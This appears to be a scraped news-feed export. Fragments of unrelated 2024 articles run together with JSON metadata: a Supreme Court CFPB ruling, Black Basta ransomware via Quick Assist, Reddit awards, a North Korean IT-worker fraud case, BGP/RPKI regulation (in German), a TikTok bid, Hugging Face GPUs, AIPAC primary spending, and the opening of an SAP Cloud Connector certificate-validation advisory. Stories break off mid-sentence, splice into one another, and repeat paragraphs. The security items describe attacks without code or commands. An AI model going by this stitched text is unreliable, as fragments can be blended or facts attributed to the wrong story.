And as it turns out, its funding mechanism is perfectly constitutional, the court ruled Thursday in a 7-2 decision.\nIts conclusion was straightforward: When it created the CFPB, Congress passed a law that authorized expenditures from specific sources to fund the agency. This satisfies the Appropriations Clause of the Constitution, the court ruled.\nThe attack on the CFPB is not the only challenge brought this term by conservative opponents of modern regulatory agencies. In as-yet-undecided cases, the Supreme Court will consider whether to curtail the powers of the Securities Exchange Commission and whether to gut a landmark standard for all regulatory oversight. Challenges to the National Labor Relations Board are working their way through lower courts.\nIn all three cases before the Supreme Court this term, legions of conservative legal luminaries urged the justices to shrink the administrative state. In the CFPB challenge, however, they lost even Justice Clarence Thomas, who wrote the majority opinion, plus three others from the Court\u2019s conservative supermajority. Only Justices Samuel Alito and Neil Gorsuch dissented.\nAs The Intercept reported last year, the case was brought and bankrolled by payday lenders, who asserted the way the CFBP is funded is unconstitutional. If so, every regulation the CFPB ever issued was potentially invalid \u2014 including rules issued in 2017 for high-interest loans, which irked payday lenders.\nCongress designed the CFPB in response to the 2008 financial crisis, engineering it to be shielded from certain political winds via provisions insulating its funding and leadership in ways that differ from most federal departments. Four years ago, in a sign that the Roberts Court was eager to hear these kinds of broad challenges, the Supreme Court invalidated provisions regarding CFPB\u2019s leadership structure but left it otherwise intact.\nThe latest attempt to finish off the CFPB came with impeccable conservative provenance. In 2022, a panel of the Fifth U.S. Circuit Court of Appeals \u2014 all appointed by former President Donald Trump \u2014 ruled that CFPB\u2019s funding mechanism was unconstitutional.\nBefore the Supreme Court, former solicitor general Noel Francisco, who clerked for late Justice Antonin Scalia and notoriously refused to defend the CFPB during his tenure in the Trump administration, argued for the payday lenders. A slew of friend-of-court briefs urged the court to sink the CFPB or at least cut off its funding, including conservative stalwarts like the U.S. Chamber of Commerce, New Civil Liberties Alliance, a coalition of Republican attorneys general, and the omnipresent John Eastman.\nIn a rebuff, the Supreme Court majority rejected these arguments, concluding its funding model was indeed constitutional.\nWhat divided the justices \u2014 even within the majority \u2014 was one of the central disagreements ushered in by Scalia and his fellow originalist revolutionaries on the bench: When the government faces thoroughly modern issues like regulating credit card penalties and semiautomatic weapons, should ancient history matter?\nJustice Thomas, an arch-originalist, went as far back as the Middle Ages, the Magna Carta, and the Glorious Revolution. His opinion, which was signed by the full majority, dwelled on how the First Congress allocated money to agencies, and barely peeked past 1800.\nIn a concurring opinion, Justice Elena Kagan pointed out that there are a couple more centuries to consider. \u201cThe way our Government has actually worked, over our entire experience, thus provides another reason to uphold Congress\u2019s decision about how to fund the CFPB,\u201d Kagan wrote. Justice Sonia Sotomayor co-signed that view, along with conservative Justices Amy Coney Barrett and Brett Kavanaugh.\nJustice Ketanji Brown Jackson, meanwhile, writing only for herself, suggested that sometimes ancient history has limited lessons for 21st-century issues like financial regulation. \u201cIn response to the devastation wrought by the 2008 financial crisis, Congress passed and the President signed the Dodd-Frank Wall Street Reform and Consumer Protection Act,\u201d she wrote, noting that the payday lenders challenging CFPB were \u201cexactly the type of entity the Bureau\u2019s progenitors sought to regulate and whose influence Congress may have feared.\u201d\n\u201cAn essential aspect of the Constitution\u2019s endurance is that it empowers the political branches to address new challenges by enacting new laws and policies \u2014 without undue interference by courts,\u201d Jackson wrote.\nIn dissent, Justices Alito and Gorsuch howled that the \u201cFramers would be shocked, even horrified\u201d by the CFPB. Alito\u2019s dissent cited Montesquieu, the practices of \u201cthe early Stuart kings\u201d in the 1600s, and the accounting methods of Alexander Hamilton, and threw in a gratuitous shoutout to an infamous 17th-century witch trial judge, Sir Matthew Hale, who birthed the legal notion that husbands cannot be prosecuted for raping their wives, which continues to haunt legal systems worldwide.\nAlito concluded: \u201cToday\u2019s decision is not faithful to the original understanding of the Appropriations Clause and the centuries of history that gave birth to the appropriations requirement, and I therefore respectfully dissent.\u201d\nThe Court is expected to issue its remaining decisions regarding regulatory agencies\u2019 authority and structure by July.\nSen. Elizabeth Warren, D-Mass., who proposed establishing the CFPB as a law professor, praised the ruling but looked ahead to future challenges.\n\u201cThis isn\u2019t the last attack on the CFPB we\u2019ll see from Wall Street, the banks & their Republican allies,\u201d Warren tweeted.", "hash": "3cc31f49f90184b1d9e17b743292795826b7fa1c16be46c2c5a7835d410eaee8", "id": "dce0474c-9d7c-4942-871a-0d02a14c6b5b", "link": "https://theintercept.com/2024/05/16/supreme-court-cfpb-consumer-finance-constitutional/", "osint_source_id": "a87d9c83-841f-455b-9e28-f8d5df3a6fb5", "published": "2024-05-16T23:34:55", "source": "https://theintercept.com/feed/?rss", "story_id": "4642bcd4-3c50-404d-aada-cc05f8a7c77c", "title": "The Consumer Finance Protection Bureau Is Constitutional, After All"}], "tags": {"Alexander Hamilton": {"name": "Alexander Hamilton", "tag_type": "PER"}, "Alito": {"name": "Alito", "tag_type": "PER"}, "Amy Coney Barrett": {"name": "Amy Coney Barrett", "tag_type": "PER"}, "Antonin Scalia": {"name": "Antonin Scalia", "tag_type": "PER"}, "Appropriations Clause": {"name": "Appropriations Clause", "tag_type": "MISC"}, "Brett Kavanaugh": {"name": "Brett Kavanaugh", "tag_type": "PER"}, "Bureau": {"name": "Bureau", "tag_type": "ORG"}, "CFPB": {"name": "CFPB", "tag_type": "ORG"}, "Congress": {"name": "Congress", "tag_type": "ORG"}, "Donald Trump": {"name": "Donald Trump", "tag_type": "PER"}, "Elena Kagan": {"name": "Elena Kagan", "tag_type": "PER"}, "Elizabeth Warren": {"name": "Elizabeth Warren", "tag_type": "PER"}, "Gorsuch": {"name": "Gorsuch", "tag_type": "PER"}, "Jackson": {"name": "Jackson", "tag_type": "PER"}, "John Eastman": {"name": "John Eastman", "tag_type": "PER"}, "Justice": {"name": "Justice", "tag_type": "ORG"}, "Justices": {"name": "Justices", "tag_type": "ORG"}, "Kagan": {"name": "Kagan", "tag_type": "PER"}, "Matthew Hale": {"name": "Matthew Hale", "tag_type": "PER"}, "Montesquieu": {"name": "Montesquieu", "tag_type": "PER"}, "Neil Gorsuch": {"name": "Neil Gorsuch", "tag_type": "PER"}, "Noel Francisco": {"name": "Noel Francisco", "tag_type": "PER"}, "Republican": {"name": "Republican", "tag_type": "MISC"}, "Samuel Alito": {"name": "Samuel Alito", "tag_type": "PER"}, "Scalia": {"name": "Scalia", "tag_type": "PER"}, "Securities Exchange Commission": {"name": "Securities Exchange Commission", "tag_type": "ORG"}, "Sonia Sotomayor": {"name": "Sonia Sotomayor", "tag_type": "PER"}, "Supreme Court": {"name": "Supreme Court", "tag_type": "ORG"}, "Thomas": {"name": "Thomas", "tag_type": "PER"}, "Wall Street": {"name": "Wall Street", "tag_type": "LOC"}, "Warren": {"name": "Warren", "tag_type": "PER"}}, "title": "The Consumer Finance Protection Bureau Is Constitutional, After All"}, {"attributes": [{"created": "2024-05-17T01:08:29.107172", "id": "e0281863-9e08-45b2-9d0d-5328832e3a2b", "key": "WORDLIST_BOT", "value": "2"}, {"created": "2024-05-17T01:10:25.663046", "id": "aa653156-3245-4857-ab38-4d3b786aa687", "key": "NLP_BOT", "value": "10"}], "created": "2024-05-16T23:30:05", "id": "fe5356a4-91f7-451e-839b-7d6030a662c6", "news_items": [{"author": "Jessica Lyons", "content": "Crims abusing Microsoft Quick Assist to deploy Black Basta ransomware\nSpoiler alert: it's not really IT support controlling your device\nA cybercrime gang has been abusing Microsoft's Quick Assist application in social engineering attacks that ultimately allow the crew to infect victims with Black Basta ransomware.\nThis, according to Redmond, which said the campaign has been ongoing since mid-April, and blamed a financially motivated group it tracks as Storm-1811 for the intrusions.\nMicrosoft did not immediately respond to The Register's questions about the attack, including how many customers have been hit.

From the report: The company sunset its awards program last year along with the ability for users to purchase coins. At the same time, Reddit introduced \"Golden Upvotes,\" which were purchased directly through cash. In a new post, the company said the system wasn't as expressive as awards. \"While the golden upvote was certainly simpler in theory, in practice, it missed the mark. It wasn't as fun or expressive as legacy awards, and it was unclear how it benefited the recipient,\" the social network said.\nUsers who want to give awards to posts and comments will need to buy \"gold,\" which kind of replaces coins. On a support page, the company mentioned that, on average, awards cost anywhere between 15 to 50 gold. Gold packages in Reddit's mobile apps currently start at $1.99 for 100 gold. Users can buy as much as 2,750 gold for $49.99. The company is also adding some safeguards to the awards system, such as disabling awards in NSFW subreddits, trauma and addiction support subreddits, and subreddits with mature content.

(Score:4, Interesting)\nThe \"gameplay loop\" for reddit awards within reddits gamification makes no sense as part of an organic users day-to-day use of the platform. It only serves as a way of laundering signal boosting. It's about folks who work for corporations being able to promote content that supports their business model while remaining hidden. That's the only use-case for reddit awards that actually make any sense given the incentives at play. So let's be honest, this isn't about rewards for users, this just another way for marketing grifters to ensure that corporate-friendly content appears first and foremost on a users feed.\nThe top comment on every single reddit article for the first decade of the platform was always a critical examination of the fact pattern and sourcing of the article itself. Now the top comment on almost every single news article is an ironically posted pop culture reference that promotes a popular brand that also happens to advertise on reddit. This reward system is about getting folks to pay reddit for signal booster instead of paying for swarms of upvotes. Except both strategies make the platform and the product less effective.\nSo this is just about promoting ads, right? Here's the funny part...guess what happens when you put too many ads in front of users...users hate ads. Remember Digg! These awards are actually just going to signal to users that a comment or post as having a monetary value to an advertiser. And folks will eventually just stop looking at stuff because of the awards!\nMarketing doesn't work because everyone hates it. So when they are inundated by marketing content that can tell what's being promoted and they blame that thing for the spam. Go ahead, dinguses, keep burning on the promotion of bad ideas, the more money you burn the faker your message looks and the less effective all future marketing becomes. Paying for ads on the internet makes advertisers look less honest and more predatory.\nNO ONE LIKES SPAM\nOpenAI (Score:3)\nOpenAI announced that they're buying user data from Reddit today.

Chapman allegedly funneled the money to North Korea\u2019s Munitions Industry Department, which is involved in key aspects of North Korea\u2019s weapons program, including its development of ballistic missiles.\nPart of the alleged scheme involved Chapman and co-conspirators compromising the identities of more than 60 people living in the US and using their personal information to get North Koreans IT jobs across more than 300 US companies.\nIn the indictment, prosecutors wrote:\nThe conspiracy perpetrated a staggering fraud on a multitude of industries, at the expense of generally unknowing US companies and persons. It impacted more than 300 US companies, compromised more than 60 identities of US persons, caused false information to be conveyed to DHS on more than 100 occasions, created false tax liabilities for more than 35 US persons, and resulted in at least $6.8 million of revenue to be generated for the overseas IT workers. The overseas IT workers worked at blue-chip US companies, including a top-5 national television network and media company, a premier Silicon Valley technology company, an aerospace and defense manufacturer, an iconic American car manufacturer, a high-end retail chain, and one of the most recognizable media and entertainment companies in the world, all of which were Fortune 500 companies.\nAs another part of the alleged conspiracy, Chapman operated a \u201claptop farm\u201d at one of her residences to give the employers the impression the North Korean IT staffers were working from within the US; the laptops were issued by the employers. By using proxies and VPNs, the overseas workers appeared to be connecting from US-based IP addresses. Chapman also received employees\u2019 paychecks at her home, prosecutors said.\nFederal prosecutors said that Chapman and three North Korean IT workers\u2014using the aliases of Jiho Han, Chunji Jin, Haoran Xu, and others\u2014had been working since at least 2020 to plan a remote-work scheme. In March of that year, prosecutors said, an individual messaged Chapman on LinkedIn and invited her to \u201cbe the US face\u201d of their company. From August to November of 2022, the North Korean IT workers allegedly amassed guides and other information online designed to coach North Koreans on how to write effective cover letters and r\u00e9sum\u00e9s and falsify US Permanent Resident Cards.\nUnder the alleged scheme, the foreign workers developed \u201cfictitious personas and online profiles to match the job requirements\u201d and submitted fake documents to the Homeland Security Department as part of an employment eligibility check. Chapman also allegedly discussed with co-conspirators about transferring the money earned from their work.\n\u201cThe charges in this case should be a wakeup call for American companies and government agencies that employ remote IT workers,\u201d Nicole Argentieri, head of the Justice Department's Criminal Division, said. \u201cThese crimes benefited the North Korean government, giving it a revenue stream and, in some instances, proprietary information stolen by the co-conspirators.\u201d\nThe indictment came alongside a criminal complaint charging a Ukrainian man with carrying out a similar multiyear scheme. Oleksandr Didenko, 27, of Kyiv, Ukraine, allegedly helped individuals in North Korea \u201cmarket\u201d themselves as remote IT workers.\nChapman was arrested Wednesday. It wasn\u2019t immediately known when she or Didenko were scheduled to make their first appearance in court. If convicted, Chapman faces 97.5 years in prison, and Didenko faces up to 67.5 years.\nreader comments\n28", "hash": "c12b6e75e8227a5c61a5ea4c12f8b4ece642cb0acd83df58c11e8880f513c90c", "id": "d1b0ae8a-05aa-4841-9dcd-35b62af46b87", "link": "https://arstechnica.com/?p=2025081", "osint_source_id": "a71fce67-918e-4ec0-bd23-e575b5149c1b", "published": "2024-05-16T22:49:22", "source": "http://feeds.arstechnica.com/arstechnica/technology-lab", "story_id": "324c9c8a-3db6-4526-8c9a-d9c03e845773", "title": "Arizona woman accused of helping North Koreans get remote IT jobs at 300 companies"}], "tags": {"American": {"name": "American", "tag_type": "MISC"}, "Arizona": {"name": "Arizona", "tag_type": "LOC"}, "Chapman": {"name": "Chapman", "tag_type": "PER"}, "DHS": {"name": "DHS", "tag_type": "ORG"}, "Didenko": {"name": "Didenko", "tag_type": "PER"}, "Haoran Xu": {"name": "Haoran Xu", "tag_type": "PER"}, "Homeland Security Department": {"name": "Homeland Security Department", "tag_type": "ORG"}, "Justice Department": {"name": "Justice Department", "tag_type": "ORG"}, "Kyiv": {"name": "Kyiv", "tag_type": "LOC"}, "LinkedIn": {"name": "LinkedIn", "tag_type": "ORG"}, "Nicole Argentieri": {"name": "Nicole Argentieri", "tag_type": "PER"}, "North Korea": {"name": "North Korea", "tag_type": "Country"}, "North Korean": {"name": "North Korean", "tag_type": "MISC"}, "Oleksandr Didenko": {"name": "Oleksandr Didenko", "tag_type": "PER"}, "US-based": {"name": "US-based", "tag_type": "MISC"}, "Ukraine": {"name": "Ukraine", "tag_type": "Country"}, "Ukrainian": {"name": "Ukrainian", "tag_type": "MISC"}}, "title": "Arizona woman accused of helping North Koreans get remote IT jobs at 300 companies"}, {"attributes": [{"created": "2024-05-17T01:23:59.696994", "id": "864b7adf-5383-44f0-95a3-40531412c63f", "key": "NLP_BOT", "value": "5"}], "created": "2024-05-16T22:41:00", "id": "52070c8c-e27c-49e5-b10c-2aa4a72ee184", "news_items": [{"author": "msmash", "content": "GTA 6 Release Date Narrowed To Fall 2025 Amid Questions about Delays 2\nTake-Two Interactive is doubling down Grand Theft Auto VI's release date, saying the long-awaited sequel will be out fall 2025 despite rumors of a possible delay into 2026.

RPKI w\u00fcrde abhelfen, ISPs sind dazu aber nicht verpflichtet. Die FCC-Chefin will das \u00e4ndern.\nDie Routingtabellen des Internet (Border Gateway Protocol, BGP) sind anf\u00e4llig f\u00fcr Manipulation. Durch \"BGP-Hijacking\" wird Datenverkehr b\u00f6swillig umgeleitet, untergeschoben oder zum Erliegen gebracht. Hinzu kommen irrt\u00fcmlich falsche Eintr\u00e4ge, die St\u00f6rungen nach sich ziehen. Die Vorsitzende der US-Regulierungsbeh\u00f6rde FCC, Jessica Rosenworcel, will US-Breitbandanbieter nun dazu verpflichten, zumindest Vorkehrungen gegen irrt\u00fcmlich falsche Routen zu setzen.\nDazu dient Resource Public Key Infrastructure (RPKI). Erst wenn RPKI ausgerollt ist, kann die n\u00e4chste Sicherheitsma\u00dfnahme BGPsec greifen, die besseren Schutz gegen absichtliches BGP-Hijacking bietet. Rosenworcel m\u00f6chte ihre vier Kollegen in der FCC davon \u00fcberzeugen, dass die Beh\u00f6rde US-Breitbandanbieter dazu verpflichtet, ihre Datenrouten mit RPKI abzusichern.\nDie neun gr\u00f6\u00dften ISP des Landes sollen au\u00dferdem Berichte vorlegen m\u00fcssen: Einen geheimen Bericht, der ihre Pl\u00e4ne zur Einf\u00fchrung von RPKI darlegt, sowie quartalsweise \u00f6ffentliche Fortschrittsberichte, die auch zeigen sollen, ob der Umsetzungsplan vern\u00fcnftig ist. Zur Begr\u00fcndung verweist Rosenworcel auf nicht spezifizierte Sicherheitswarnungen von US-Geheimdiensten, sowie auf Ergebnisse einer FCC-Untersuchung aus dem Jahr 2022 und einen Border Gateway Protocol Security Workshop aus dem letzten Sommer.\nVerz\u00f6gerung durch Abschaffung der Netzneutralit\u00e4t\nDas Problem ungesicherter Datenrouten ist lange bekannt. Schon als BGP 1989 eingef\u00fchrt wurde, haben Experten darauf hingewiesen, dass Verkehr im Internet leicht umgeleitet werden kann, sodass Angreifer den Datenverkehr sehen, ver\u00e4ndern oder einfach verschwinden lassen k\u00f6nnten. Lange geschah wenig. Vor etwa 20 Jahren wurde schlie\u00dflich die kryptographische Absicherung des Routing-Systems durch RPKI und BGPsec entworfen. Die Einf\u00fchrung erfolgt jedoch nur schleppend, obwohl staatliche Angreifer insbesondere aus Russland immer wieder die Internet-Infrastruktur angreifen.\nWarum die FCC erst jetzt t\u00e4tig wird, ist allerdings leicht erkl\u00e4rt: Kurz vor Ende der Amtszeit Donald Trumps als US-Pr\u00e4sident hat sich die FCC selbst die Zust\u00e4ndigkeit zur Internetregulierung entzogen. Auf diese Weise schaffte es die damalige Republikaner-Mehrheit in der FCC, die Netzneutralit\u00e4t abzuschaffen. Und nach dem Amtsantritt des Demokraten Joe Biden verhinderten Republikaner im US-Parlament lange Zeit die Nachbesetzung eines den Demokraten zustehenden FC-Commissioners.\nErst vor wenigen Wochen konnte die FCC sich die Zust\u00e4ndigkeit f\u00fcr die Regulierung von Internet Service Providern wieder sichern und die Netzneutralit\u00e4t wieder einf\u00fchren. Das greift Ende Juni. Entsprechend hat es nun Sinn, weitere Aspekte der Internetregulierung in Angriff zu nehmen.\nBGP und RPKI\nDas BG-Protokoll (RFC 1105) spezifiziert den Austausch von Informationen zwischen Routern, auf deren Basis sie die beste Route f\u00fcr die zwischen ihren Netzen \u2013 den Autonomen Systemen (AS) \u2013 \u00fcbermittelten Datenpaketen identifizieren k\u00f6nnen. In Routing-Tabellen halten die Border-Router die besten Pfade fest. Das Border Gateway Protocol krankt daran, dass es aus einer Zeit stammt, als man einander im Netz noch vertraut hat. Jeder darf beliebige Routen verlautbaren, automatische Kontrollen sind nicht vorgesehen.\nBeim sogenannten Pr\u00e4fix-Hijacking gibt ein Angreifer die Pr\u00e4fixe seiner Opfer als eigene aus. Beispielsweise kann das angreifende Netz spezifischere Adressen aus dem Netz des Opfers ank\u00fcndigen oder behaupten, eine Abk\u00fcrzung zu bestimmten IP-Adressbl\u00f6cken zu bieten. Router ohne RPKI m\u00fcssen das einfach glauben.\nMit RPKI (RFC 6840 plus \u00fcber 40 weitere RFCs) kann mittels Route Origin Authorisations (ROA )festgelegt werden, f\u00fcr welche IP-Pr\u00e4fixe ein Autonomous System verantwortlich ist. K\u00fcndigt es pl\u00f6tzlich andere IP-Pr\u00e4fixe an, l\u00f6st das Alarm aus. Damit sollen in erster Linie die h\u00e4ufig vorkommenden Fehler bei der Ank\u00fcndigung von Routen verhindert werden. Das vielleicht bekannteste Beispiel daf\u00fcr ist die Umleitung von YouTube-Verkehr zur Pakistan Telecom.\nZukunftsmusik BGPsec\nTheoretisch gibt es seit 2017 auch eine Waffe gegen absichtliches BGP-Hijacking: BGPsec (RFC 8204). Es sichert die Routing-Informationen auf dem Weg durch das Netz ab. Statt allein die Authentizit\u00e4t des Ursprungs einer Routenank\u00fcndigung zu pr\u00fcfen, soll so sichergestellt werden, dass entlang des Pfades keine Manipulationen passieren. Es h\u00fclfe aber nur, wenn erstens RPKI ausgerollt ist und zweitens alle Netzbetreiber gleichzeitig auf BGPsec umstellten, sodass unsignierte Informationen ignoriert werden d\u00fcrften. Eine solche Umstellung ist nicht in Sicht, weil daf\u00fcr viele Router ausgetauscht werden m\u00fcssen und die Netzbetreiber erheblichen Mehraufwand f\u00fcr die Verwaltung all der BGPsec-Schl\u00fcssel h\u00e4tten, die f\u00fcr jeden Routing-Hop notwendig sind.\nAu\u00dferdem setzt BGPsec voraus, dass man den Ausstellern der kryptografischen Zertifikate vertraut. Stehen diese Stellen jedoch unter staatlicher Kontrolle, ist vielleicht nicht viel gewonnen. Denn die meisten Manipulationen gehen auf T\u00e4ter aus korrupten L\u00e4ndern oder gar auf staatliche Akteure, die ihre eigenen Interessen verfolgen, zur\u00fcck. Sie k\u00f6nnten auch Zertifikate ausstellen, die ihren Attacken den Anschein von Legitimit\u00e4t verleihen.\nEmpfohlener redaktioneller Inhalt\nMit Ihrer Zustimmmung wird hier ein externes YouTube-Video (Google Ireland Limited) geladen.\nIch bin damit einverstanden, dass mir externe Inhalte angezeigt werden.

Ever since the US government made it clear it was seriously going to move forward with the obviously unconstitutional and counterproductive plan to force ByteDance to divest from TikTok or have the app effectively banned from the U.S., various rich people have been stepping up with promises to buy the app. There was former Trump Treasury Secretary Steven Mnuchin with plans to buy it. Then there was \"mean TV investor, who wants you to forget his sketchy history\" Kevin O'Leary with his own TikTok buyout plans. I'm sure there have been other rich dudes as well, though strikingly few stories of actual companies interested in purchasing TikTok.\nBut now there's another billionaire to add to the pile: billionaire real estate/property mogul Frank McCourt (who has had some scandals in his own history) has had an interesting second act over the last few years as a big believer in decentralized social media. He created and funded Project Liberty, which has become deeply involved in a number of efforts to create infrastructure for decentralized social media, including its own Decentralized Social Networking Protocol (DSTP).\nOver the past few years, I've had a few conversations with people involved in Project Liberty and related projects. Their hearts are in the right place in wanting to rethink the internet in a manner that empowers users over big companies, even if I don't always agree with their approach (he also frequently seems to surround himself with all sorts of tech haters, who have somewhat unrealistic visions of the world). Either way, McCourt and Project Liberty have now announced a plan to bid on TikTok. They plan to merge it into his decentralization plans. \"Frank McCourt, Founder of Project Liberty and Executive Chairman of McCourt Global, today announced that Project Liberty is organizing a bid to acquire the popular social media platform TikTok in the U.S., with the goal of placing people and data empowerment at the center of the platform's design and purpose,\" reads a press release from Project Liberty.\n\"Working in consultation with Guggenheim Securities, the investment banking and capital markets business of Guggenheim Partners, and Kirkland & Ellis, one of the world's largest law firms, as well as world-renowned technologists, academics, community leaders, parents and engaged citizens, this bid for TikTok offers an innovative, alternative vision for the platform's infrastructure -- one that allows people to reclaim agency over their digital identities and data by proposing to migrate the platform to a new digital open-source protocol.

The goal is to help small developers, academics, and startups counter the centralization of AI advancements. [...] Delangue is concerned about AI startups' ability to compete with the tech giants. Most significant advancements in artificial intelligence -- like GPT-4, the algorithms behind Google Search, and Tesla's Full Self-Driving system -- remain hidden within the confines of major tech companies. Not only are these corporations financially incentivized to keep their models proprietary, but with billions of dollars at their disposal for computational resources, they can compound those gains and race ahead of competitors, making it impossible for startups to keep up. Hugging Face aims to make state-of-the-art AI technologies accessible to everyone, not just the tech giants. [...]\nAccess to compute poses a significant challenge to constructing large language models, often favoring companies like OpenAI and Anthropic, which secure deals with cloud providers for substantial computing resources. Hugging Face aims to level the playing field by donating these shared GPUs to the community through a new program called ZeroGPU. The shared GPUs are accessible to multiple users or applications concurrently, eliminating the need for each user or application to have a dedicated GPU. ZeroGPU will be available via Hugging Face's Spaces, a hosting platform for publishing apps, which has over 300,000 AI demos created so far on CPU or paid GPU, according to the company.\nAccess to the shared GPUs is determined by usage, so if a portion of the GPU capacity is not actively utilized, that capacity becomes available for use by someone else. This makes them cost-effective, energy-efficient, and ideal for community-wide utilization. ZeroGPU uses Nvidia A100 GPU devices to power this operation -- which offer about half the computation speed of the popular and more expensive H100s. \"It's very difficult to get enough GPUs from the main cloud providers, and the way to get them -- which is creating a high barrier to entry -- is to commit on very big numbers for long periods of times,\" Delangue said. Typically, a company would commit to a cloud provider like Amazon Web Services for one or more years to secure GPU resources. This arrangement disadvantages small companies, indie developers, and academics who build on a small scale and can't predict if their projects will gain traction. Regardless of usage, they still have to pay for the GPUs. \"It's also a prediction nightmare to know how many GPUs and what kind of budget you need,\" Delangue said.\nAccess to compute poses a significant challenge to constructing large language models, often favoring companies like OpenAI and Anthropic, which secure deals with cloud providers for substantial computing resources.

ZeroGPU uses Nvidia A100 GPU devices to power this operation -- which offer about half the computation speed of the popular and more expensive H100s. \"It's very difficult to get enough GPUs from the main cloud providers, and the way to get them -- which is creating a high barrier to entry -- is to commit on very big numbers for long periods of times,\" Delangue said. Typically, a company would commit to a cloud provider like Amazon Web Services for one or more years to secure GPU resources. This arrangement disadvantages small companies, indie developers, and academics who build on a small scale and can't predict if their projects will gain traction. Regardless of usage, they still have to pay for the GPUs. \"It's also a prediction nightmare to know how many GPUs and what kind of budget you need,\" Delangue said.\nRe: (Score:1)\nSo, what happened to that one?

Jamaal Bowman in the Democratic primary in New York\u2019s 16th Congressional District. The ads claim that Bowman \u201chas his own agenda\u201d and refuses to work with President Joe Biden.\nUnited Democracy Project, the AIPAC super PAC, bought its first set of ads this week for $1.9 million, disclosing that it planned to spend the money in a week, to oppose Bowman in the race against Westchester County executive George Latimer. The primary election takes place June 25.\nLatimer, who was recruited to run by AIPAC and has received huge contributions directly from the group, has had nearly a million dollars of support from outside groups before AIPAC weighed in. Bowman also has outside support, but it\u2019s a fraction of AIPAC\u2019s spending so far for Latimer. Known as \u201cindependent expenditures,\u201d outside groups can weigh in on elections but not in coordination with campaigns.\nWith the new AIPAC money to attack Bowman, outside groups in the race are spending nearly 10 times more in Latimer\u2019s favor \u2014 with roughly $3 million total for Latimer and against Bowman, and Bowman supporters spending only about $285,000.\nLatimer is also raking in more cash than Bowman in direct campaign contributions. His campaign itself has raised $3.6 million so far to Bowman\u2019s $2.7 million. Latimer\u2019s haul includes major support from Republican donors \u2014 almost a quarter of it was bundled by AIPAC. In the last quarter of 2023, almost half of Latimer\u2019s contributions came through AIPAC.\n\u201cNY-16 Democrats are united in rejecting MAGA\u2019s threat to our freedoms, which is why Trump Republicans are funding a $1.9 million ad spend to distract us from their attempt to buy our seat,\u201d Bowman campaign spokesperson Lawrence Wang said in a statement to The Intercept. \u201cBut voters know the truth: if MAGA\u2019s top priority is unseating Jamaal Bowman, ours is to re-elect him.\u201d\nUnited Democracy Project did not respond to a request for comment.\nLatimer has courted Republican donors and held fundraisers hosted by Republicans, including a major GOP donor to former President Donald Trump. Another AIPAC donor has been encouraging Republicans to switch parties to vote against Bowman in the primary \u2014 one Republican voter told The Intercept he recently switched parties just to vote for Latimer. Latimer\u2019s campaign distanced itself from the GOP-hosted fundraisers and said he had no control over who hosted fundraising events.\nThe big outside spending push by AIPAC helps cement its status as one of if not the biggest spender in Democratic Party primaries. The pro-Israel lobby planned to spend $100 million this cycle to oust members of the Squad who have been critical of U.S. military funding for Israel and led calls for a ceasefire in Gaza.\nAfter failing to unseat Rep. Summer Lee, D-Pa., AIPAC\u2019s next top targets are Bowman and Rep. Cori Bush, D-Mo. AIPAC recruited Latimer to run against Bowman and has backed Bush\u2019s challenger, Wesley Bell. Its super PAC is expected to spend up to $20 million on each race.\nKnown as \u201cindependent expenditures,\u201d outside groups like PACs can spend unlimited amounts on elections but are not supposed to coordinate with campaigns. In practical terms, however, a system of winks and nods can help campaigns point outside spenders to ideas about messaging \u2014 a tactic AIPAC has availed itself of.\nAIPAC\u2019s Primary Occupation\nThe race between Bowman and Latimer has been a chaotic one. Latimer\u2019s campaign came under scrutiny when it first launched for leaving the Bronx, part of which is in the district, off of his website and only mentioning Westchester County, which is a primarily white suburb. Latimer was also criticized for comments claiming that Bowman took money from Hamas. Latimer told City & State that he wouldn\u2019t be able to win if more Bronx voters were drawn in as part of redistricting.\nBowman has had his own share of snafus. His decision to pull the fire alarm in Congress over the summer has plagued the campaign and become fodder in new attack ads. Critics have also raised questions about conspiratorial content he follows on YouTube, though it\u2019s unclear whether he has watched or engaged with the videos.\nIn a Twitter thread posted Thursday, Lee, the Pennsylvania representative who just won her primary, criticized AIPAC for targeting Black Democrats while using its support for members of the Congressional Black Caucus as cover. \u201cWhile the biggest threat to Black America is white supremacist policymakers, they financially support the folks causing us the most harm,\u201d Lee wrote.\nAIPAC supported several candidates of color last cycle, including Glenn Ivey, Adam Hollier, Henry Cuellar, Shontel Brown, Valerie Foushee, and Don Davis. Almost all of AIPAC\u2019s independent expenditures against Democrats in the 2022 primaries were spent against candidates of color. The rest was spent against former Rep. Andy Levin, a Jewish member of Congress.\nUsamah Andrabi, a spokesperson for Justice Democrats, which spent at least $165,000 on mail and digital ads supporting Bowman and attacking Latimer\u2019s GOP ties, said that Republicans were using United Democracy Project to target Democrats of color. The Working Families Party has spent $118,000 so far to support Bowman, with plans for additional spending.\n\u201cThis is the same tactic we\u2019ve seen across the country, Republican billionaires using AIPAC\u2019s super PAC to spend millions of dollars targeting Democrats of color in Democratic primaries,\u201d Andrabi said. \u201cVoters should know that every ad they see attacking Jamaal Bowman or defending George Latimer is being funded by the same GOP megadonors who want to ban abortion, defend insurrectionists, and elect Donald Trump.\u201d", "hash": "278b00ee21176755429c03e5d4447fdd36119f80d2f7487d640732022612f160", "id": "d100e33e-2126-40fc-a92b-8865d89240aa", "link": "https://theintercept.com/2024/05/16/aipac-jamaal-bowman-attack-ads-george-latimer/", "osint_source_id": "a87d9c83-841f-455b-9e28-f8d5df3a6fb5", "published": "2024-05-16T21:08:07", "source": "https://theintercept.com/feed/?rss", "story_id": "4f1a6db5-8460-4523-9dc6-26d41ae50372", "title": "Outside Groups Spent $285,000 Backing Jamaal Bowman.

Thus, an attacker can impersonate the genuine servers to interact\nwith the SCC, hence breaking the mutual authentication promise. Our analysis shows\nfurthermore that the product does not implement Certificate Pinning for the\ntrusted endpoints.\nThe security impact of this vulnerability is rated high due to the trust put\ninto self-signed certificates, SCC is unable to distinguish between genuine and\nmalicious SAP BTP endpoints, rendering trivial adversary-in-the-middle attacks\npossible.\nProof of concept:\n-----------------\n1) Tolerating Self-Signed Certificates (CVE-2024-25642)\nA \"tunnel\" established between a subaccount of SAP BTP and SCC represents a\nlong-lived bi-directional WebSocket over TLS customized by the vendor.\nSuch a tunnel is initiated by the SCC, known as reverse invoke approach,\nto give the administrator full control of the tunnel.\nTwo tunnels established by SCC are protected by TLS with respect to encrypted\ncommunication. However, SCC does not verify the authenticity of the\ncertification authority, hence allowing an attacker to impersonate the target\nserver, using self-signed certificates.\nIn particular, the attack is targeted at the following two endpoints, but not\nlimited to the region host us10.\n- connectivitynotification.cf.us10.hana.ondemand.com\n- 